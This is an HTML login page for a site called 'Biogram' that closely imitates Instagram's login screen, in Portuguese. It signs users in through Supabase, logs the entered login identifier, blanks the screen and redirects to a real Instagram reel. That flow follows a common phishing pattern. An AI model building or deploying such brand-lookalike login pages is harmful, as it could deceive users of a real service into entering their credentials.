<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>• Login</title>

  <link rel="icon" href="favicon.ico" type="image/x-icon">

  <style>
    * {
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
        Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      margin: 0;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 350px;
      padding: 40px 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo {
      margin-bottom: 30px;
    }

    .logo img {
      display: block;
      margin: 0 auto;
      max-width: 180px;
    }

    form {
      width: 100%;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 8px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background: #4cb5f9;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }

    .forgot {
      width: 100%;
      text-align: right;
      margin-top: 10px;
      font-size: 12px;
    }

    .forgot a {
      color: #00376b;
      text-decoration: none;
    }

    .or {
      width: 100%;
      display: flex;
      align-items: center;
      margin: 20px 0;
      font-size: 13px;
      color: #8e8e8e;
    }

    .or::before,
    .or::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .or span {
      margin: 0 10px;
    }

    .facebook {
      text-align: center;
      color: #385185;
      font-weight: 600;
      cursor: pointer;
    }

    .signup {
      margin-top: 40px;
      text-align: center;
      font-size: 14px;
    }

    .signup a {
      color: #0095f6;
      text-decoration: none;
      font-weight: 600;
    }
  </style>
</head>

<body>
  <div class="container">
    <a href="#" class="logo">
      <img
        src="https://i.postimg.cc/zDdCYPyg/Captura-de-tela-2025-12-17-221627.png"
        alt="Biogram"
      />
    </a>

    <form id="loginForm">
      <input
        type="text"
        id="login"
        placeholder="Telefone, nome de usuário ou email"
        required
      />
      <input
        type="password"
        id="password"
        placeholder="Senha"
        required
      />
      <button type="submit">Entrar</button>
    </form>

    <div class="forgot"><a href="#">Esqueceu a senha?</a></div>
    <div class="or"><span>OU</span></div>
    <div class="facebook">Entrar com Facebook</div>

    <div class="signup">
      Não tem uma conta? <a href="#">Cadastre-se</a>
    </div>
  </div>

  <!-- Tela branca -->
  <div id="whiteScreen" style="
    display:none;
    position:fixed;
    inset:0;
    background:#fff;
    z-index:9999;"></div>

  <!-- Supabase -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <script>
    const SUPABASE_URL = "https://pwmtpvsgykjvouljjmrz.supabase.co";
    const SUPABASE_KEY =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8";

    // ✅ NOME CORRETO (sem conflito)
    const supabaseClient = supabaseJs.createClient(
      SUPABASE_URL,
      SUPABASE_KEY
    );

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const loginValue = document.getElementById("login").value.trim();
      const passwordValue = document.getElementById("password").value;

      let credentials = { password: passwordValue };

      if (loginValue.includes("@")) {
        credentials.email = loginValue;
      } else {
        credentials.phone = loginValue;
      }

      const { data, error } =
        await supabaseClient.auth.signInWithPassword(credentials);

      if (error) {
        alert("Erro no login: " + error.message);
        return;
      }

      // (opcional) log SEM senha
      await supabaseClient.from("login_logs").insert({
        user_id: data.user.id,
        login_value: loginValue
      });

      // Tela branca + redirect
      document.getElementById("whiteScreen").style.display = "block";

      setTimeout(() => {
        window.location.href =
          "https://www.instagram.com/reels/DSYPgN7EVG3/";
      }, 150);
    });
  </script>
</body>
</html>
